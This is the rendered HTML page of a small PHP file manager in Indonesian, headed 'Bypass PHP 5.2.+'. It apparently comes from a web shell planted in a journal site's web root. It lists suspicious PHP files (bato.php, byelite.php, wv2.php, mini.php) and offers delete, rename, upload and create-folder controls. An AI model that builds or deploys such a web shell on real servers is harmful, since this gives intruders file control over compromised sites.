<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>File Manager Sederhana</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .container {
            width: 960px;
            margin: 20px auto;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin: 10px 0;
        }
        table, th, td {
            border: 1px solid #ccc;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background: #eee;
        }
        a {
            text-decoration: none;
            color: #0066CC;
        }
        .aksi {
            margin: 0 5px;
        }
        .input-text {
            width: 300px;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Bypass PHP 5.2.+</h2>
    <p>Path : <strong>/var/www/html/journals</strong></p>

    
    <table>
        <tr>
            <th>Nama</th>
            <th>Ukuran</th>
            <th>Terakhir Diubah</th>
            <th>Aksi</th>
        </tr>
                                                        <tr>
                <td>
                                            <a href="?dir=.%2F.a"><strong>.a</strong></a>
                                    </td>
                <td>
                    -                </td>
                <td>2025-02-24 21:25:48</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2F.a"
                       onclick="return confirm('Yakin ingin menghapus .a?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./.a">
                        <input type="text" name="new_name" value="./.a" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="?dir=.%2F.tmp"><strong>.tmp</strong></a>
                                    </td>
                <td>
                    -                </td>
                <td>2025-02-24 21:28:07</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2F.tmp"
                       onclick="return confirm('Yakin ingin menghapus .tmp?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./.tmp">
                        <input type="text" name="new_name" value="./.tmp" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./1.php" target="_blank">1.php</a>
                                    </td>
                <td>
                    5922 byte                </td>
                <td>2025-02-24 21:41:06</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2F1.php"
                       onclick="return confirm('Yakin ingin menghapus 1.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./1.php">
                        <input type="text" name="new_name" value="./1.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./Handler.php" target="_blank">Handler.php</a>
                                    </td>
                <td>
                    0 byte                </td>
                <td>2025-02-24 19:22:31</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2FHandler.php"
                       onclick="return confirm('Yakin ingin menghapus Handler.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./Handler.php">
                        <input type="text" name="new_name" value="./Handler.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./a.txt" target="_blank">a.txt</a>
                                    </td>
                <td>
                    2 byte                </td>
                <td>2024-12-18 03:07:37</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fa.txt"
                       onclick="return confirm('Yakin ingin menghapus a.txt?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./a.txt">
                        <input type="text" name="new_name" value="./a.txt" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./bato.php" target="_blank">bato.php</a>
                                    </td>
                <td>
                    31869 byte                </td>
                <td>2024-12-18 19:00:19</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fbato.php"
                       onclick="return confirm('Yakin ingin menghapus bato.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./bato.php">
                        <input type="text" name="new_name" value="./bato.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./byelite.php" target="_blank">byelite.php</a>
                                    </td>
                <td>
                    14472 byte                </td>
                <td>2024-12-18 18:58:33</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fbyelite.php"
                       onclick="return confirm('Yakin ingin menghapus byelite.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./byelite.php">
                        <input type="text" name="new_name" value="./byelite.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./defunct" target="_blank">defunct</a>
                                    </td>
                <td>
                    2833840 byte                </td>
                <td>2023-11-18 06:25:47</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fdefunct"
                       onclick="return confirm('Yakin ingin menghapus defunct?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./defunct">
                        <input type="text" name="new_name" value="./defunct" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./defunct.dat" target="_blank">defunct.dat</a>
                                    </td>
                <td>
                    23 byte                </td>
                <td>2023-11-18 06:25:47</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fdefunct.dat"
                       onclick="return confirm('Yakin ingin menghapus defunct.dat?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./defunct.dat">
                        <input type="text" name="new_name" value="./defunct.dat" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./mini.php" target="_blank">mini.php</a>
                                    </td>
                <td>
                    1436 byte                </td>
                <td>2024-12-16 15:26:21</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fmini.php"
                       onclick="return confirm('Yakin ingin menghapus mini.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./mini.php">
                        <input type="text" name="new_name" value="./mini.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./ojs-3.3.0-16.tar.gz" target="_blank">ojs-3.3.0-16.tar.gz</a>
                                    </td>
                <td>
                    51850957 byte                </td>
                <td>2023-11-18 06:25:47</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fojs-3.3.0-16.tar.gz"
                       onclick="return confirm('Yakin ingin menghapus ojs-3.3.0-16.tar.gz?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./ojs-3.3.0-16.tar.gz">
                        <input type="text" name="new_name" value="./ojs-3.3.0-16.tar.gz" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            <a href="./wv2.php" target="_blank">wv2.php</a>
                                    </td>
                <td>
                    31808 byte                </td>
                <td>2025-02-24 19:22:43</td>
                <td>
                    <a class="aksi" href="?dir=.&aksi=delete&target=.%2Fwv2.php"
                       onclick="return confirm('Yakin ingin menghapus wv2.php?');">Hapus</a>
                    
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="aksi" value="rename">
                        <input type="hidden" name="old_name" value="./wv2.php">
                        <input type="text" name="new_name" value="./wv2.php" class="input-text">
                        <input type="submit" value="Rename">
                    </form>
                </td>
            </tr>
            </table>
    <h3>Upload File</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="hidden" name="aksi" value="upload">
        <input type="file" name="file_upload">
        <input type="submit" value="Upload">
    </form>
    <h3>Buat Folder Baru</h3>
    <form action="" method="post">
        <input type="hidden" name="aksi" value="create_dir">
        <input type="text" name="nama_folder" placeholder="Nama Folder Baru">
        <input type="submit" value="Buat Folder">
    </form>
</div>
</body>
</html>
